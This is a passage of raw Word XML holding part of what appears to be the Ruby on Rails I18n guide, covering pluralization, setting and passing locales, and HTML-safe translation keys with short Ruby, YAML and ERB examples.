                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; 'Thanks Jeremy!'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="21E8F270" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If a translation uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:default</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:scope</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as an interpolation variable, an I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>18n::ReservedInterpolationKey</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exception is raised. If a translation expects an interpolation variable, but this has not been passed to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>#translate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n::MissingInterpolationArgument</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exception is raised.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A96E2F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 Pluralization</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF4BD17" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In English there are only one singular and one plural form for a given string, e.g. “1 message” and “2 messages”. Other languages (</w:t>
      </w:r>
      <w:hyperlink r:id="rId555" w:anchor="ar" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Arabic</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId556" w:anchor="ja" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Japanese</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId557" w:anchor="ru" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Russian</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and many more) have different grammars that have additional or fewer </w:t>
      </w:r>
      <w:hyperlink r:id="rId558" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>plural forms</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. Thus, the I18n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> provides a flexible pluralization feature.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E070828" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:count</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> interpolation variable has a special role in that it both is interpolated to the translation and used to pick a pluralization from the translations according to the pluralization rules defined by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CLDR</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5688"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7A2635D6" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3ED09BA8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.backend.store_translations :en, :inbox</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63F04D8D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :one</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; '1 message',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14DC0C0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :other</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; '%{count} messages'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58C6B219" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59AB5A73" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.translate :inbox, :count</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DB9C0CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; '2 messages'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26EC49E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The algorithm for pluralizations in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:en</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is as simple as:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2855"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5BEA09DA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51DB0F62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="678116050"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>entry[count == 1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>? 0</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>: 1]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C88D593" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">I.e. the translation denoted as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is regarded as singular, the other is used as plural (including the count being zero).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68763906" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the lookup for the key does not return a Hash suitable for pluralization, an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>18n::InvalidPluralizationData</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exception is raised.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A76861B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 Setting and Passing a Locale</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50037500" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The locale can be either set pseudo-globally to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n.locale</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (which uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Thread.current</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> like, e.g., </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.zone</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) or can be passed as an option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>#translate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>#localize</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FAC6DDF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If no locale is passed, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n.locale</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is used:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="668CA8F3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04FFDAEF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.locale = :de</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="667EAAE9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t :foo</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="246F8D4E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.l Time.now</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3D3A5449" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Explicitly passing a locale:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3648"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="20004E4B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="01C03E7A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t :foo, :locale</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :de</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47298C83" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.l Time.now, :locale</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :de</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="46C84F6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n.locale</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defaults to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n.default_locale</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which defaults to :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:t>. The default locale can be set like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3000"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1E39A472" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D9B69E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="33357973"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.default_locale = :de</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="24667CBD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.5 Using Safe </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Translations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ACC118A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Keys with a ‘_html’ suffix and keys named ‘html’ are marked as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> safe. Use them in views without escaping.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3BF60799" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51C99B6C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config/locales/en.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E5C523B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>en:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76CB6CA9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  welcome: &lt;b&gt;welcome!&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75147751" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  hello_html: &lt;b&gt;hello!&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D325C3B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  title:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00091C61" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    html: &lt;b&gt;title!&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="789259A6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21864026" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># app/views/home/index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3657C93F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;div&gt;&lt;%= t('welcome') %&gt;&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60D04EC0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;div&gt;&lt;%= raw t('welcome') %&gt;&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="326A05ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;div&gt;&lt;%= t('hello_html') %&gt;&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28721756" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;div&gt;&lt;%= t('title.html') %&gt;&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="688E4BC0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2382259B" wp14:editId="52E973C3">
            <wp:extent cx="3752850" cy="1876425"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="9" name="图片 9" descr="i18n demo html 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18n demo html safe"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId559" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3752850" cy="1876425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="35FCF66B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>5 How to Store your Custom Translations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44862F67" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The Simple backend shipped with Active Support allows you to store translations in both plain Ruby and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> format. </w:t>
      </w:r>
      <w:hyperlink r:id="rId560" w:anchor="fn2" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
            <w:vertAlign w:val="superscript"/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6AD555A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
